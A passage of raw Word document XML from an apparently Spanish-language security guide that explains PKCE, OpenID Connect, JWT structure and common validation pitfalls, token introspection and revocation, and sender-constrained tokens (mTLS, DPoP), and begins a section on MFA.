          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cómo funciona:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> el cliente genera un </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>code_verifier</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, manda su hash (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>code_challenge</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>) al pedir el</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  código, y prueba el </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>verifier</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> al canjearlo. Así, un código </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>robado</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> no sirve.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué mirar:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> PKCE "en texto plano" (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>plain</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>) en apps públicas; clientes que aceptan códigos sin</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  verificar </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>challenge</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>OpenID Connect (OIDC Core 1.0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Primera aparición:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> final, 26 de febrero de 2014.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cómo funciona:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> una capa de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>identidad</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> sobre OAuth 2.0. Agrega el </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>ID token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (un JWT con</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>iss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sub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aud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exp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amr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acr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">) y el endpoint </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>UserInfo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Qué mirar:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> validar </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>firma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iss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aud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exp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>nonce</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">; no confundir el </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>ID token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (para la</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  app) con el </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>access token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (para la API).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Introspección (RFC 7662) y revocación (RFC 7009)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué son:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> el primero permite que el servidor de recursos </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>pregunte</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> al de autorización si un token</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  sigue válido; el segundo permite </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>revocarlo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Primera aparición:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2015 y 2013, respectivamente.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué mirar:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> introspección en cada request (costo/latencia) y revocación que en realidad **no se</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  propaga** a todas las réplicas.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>4.5 JOSE: la familia de JWT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296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jwt_anatom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9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95057"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Anatomía de un JWT</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>JWS (RFC 7515):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> firma. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>JWE (RFC 7516):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> cifrado. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>JWK (RFC 7517):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> claves. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>JWA (RFC 7518):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  algoritmos. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>JWT (RFC 7519):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> el token con claims. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>JWT BCP (RFC 8725, 2020):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> las reglas para no</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  equivocarse. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>RFC 9068 (2021):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> perfil de JWT para access tokens.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cómo funciona: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1F3B66"/>
        </w:rPr>
        <w:t>header.payload.signature</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, todo en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Base64url</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Está firmado, no cifrado</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>: el</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  payload se lee.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué mirar: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1F3B66"/>
        </w:rPr>
        <w:t>alg: none</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y confusión </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>RS256→HS256</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>exp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color w:val="1F3B66"/>
        </w:rPr>
        <w:t>aud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color w:val="1F3B66"/>
        </w:rPr>
        <w:t>iss</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> sin validar; claves débiles</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  crackeables; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>kid</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> que apunta a un JWKS controlado por el atacante.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Ejemplo de claim clave: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1F3B66"/>
        </w:rPr>
        <w:t>amr: ["pwd","otp"]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (RFC 8176) dice </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>cómo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> se autenticó; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>acr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> dice con</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  qué nivel.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>4.6 Atar el token a su portador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268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ender_constrain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6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95057"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Del bearer a los tokens sender-constrained</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Token Binding (RFC 8471-8473)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Primera aparición:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2018. Ataba el token al </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>canal</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (TLS) en el que se emitió.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué pasó:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>sin adopción masiva</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>; quedó como intento. Lección: la teoría correcta no basta si el</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  ecosistema no acompaña.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>mTLS atado a certificado (RFC 8705)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Primera aparición:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2020.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cómo funciona:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> el token queda </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">ligado al </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>cnf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (thumbprint) del certificado</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> del cliente; el</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  servidor exige el certificado en cada llamada. Robar el token </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>no alcanza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Qué mirar:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> PKI y rotación de certificados; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>proxy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> o balanceador que rompe el mTLS; validar el</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  certificado del lado correcto.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>DPoP (RFC 9449)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Primera aparición:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2023.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cómo funciona:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> el cliente firma una </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>prueba</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (un JWT propio) con su clave privada, atada al</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  request vía </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>htm</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (método) y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>htu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (URL), con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>jti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> único y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>iat</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>. El servidor valida la prueba y</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>no acepta el token sin ella</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">. Robar el access token </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>no sirve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Qué mirar:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> ventana de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>iat</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, almacenamiento de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>jti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> para evitar reenvíos, claves de cliente bien</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  resguardadas, y que el </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>resource server</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>exija</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> DPoP (no que lo acepte como opcional).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>4.7 Factores de autenticación (MFA)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3276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fa_timeli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7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95057"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>La MFA protege un instante; el token vive mucho más</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>La MFA protege la emisión, no el uso.</w:t>
